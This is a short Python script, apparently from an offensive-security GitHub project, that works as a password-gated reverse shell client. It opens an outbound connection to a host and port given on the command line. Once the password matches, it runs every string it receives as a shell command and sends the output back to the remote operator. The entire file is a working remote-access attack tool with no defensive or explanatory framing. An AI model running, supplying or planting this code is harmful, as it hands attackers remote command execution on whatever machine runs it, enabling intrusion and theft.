import subprocess
import socket
from sys import argv

FORMAT = 'utf-8'


def usage():
    print(f"""
             _____  __  __               _                  _____       _               
    |  _  |/ _|/ _|             (_)                /  __ \     | |              
    | | | | |_| |_ ___ _ __  ___ ___   _____ ______| /  \/_   _| |__   ___ _ __ 
    | | | |  _|  _/ _ \ '_ \/ __| \ \ / / _ \______| |   | | | | '_ \ / _ \ '__|
    \ \_/ / | | ||  __/ | | \__ \ |\ V /  __/      | \__/\ |_| | |_) |  __/ |   
     \___/|_| |_| \___|_| |_|___/_| \_/ \___|       \____/\__, |_.__/ \___|_|   
                                                           __/ |                
                                                          |___/                 
    [+] github.com/Offensive-Cyber/ReverseShell

    USAGE-CLIENT: python3 {argv[0]} HOST-IP HOST-PORT PASSWORD
""")


def start():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = argv[1]
    port = int(argv[2])
    s.connect((host, port))
    passwd = str(argv[3])
    while True:
        s.send("Login: ".encode(FORMAT))
        pwd = s.recv(1024)
        pwd = pwd.decode(FORMAT)

        if pwd.strip() != passwd:
            continue
        else:
            s.send("Connected #> ".encode(FORMAT))
            break
    Shell(s=s)


def Shell(s):
    while True:
        data = s.recv(1024)
        data = data.decode(FORMAT)
        if data.strip() == ":kill":
            break
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)
        s.send("#>".encode(FORMAT))


def main():
    if len(argv) != 4:
        usage()
    else:
        start()


if __name__ == '__main__':
    main()

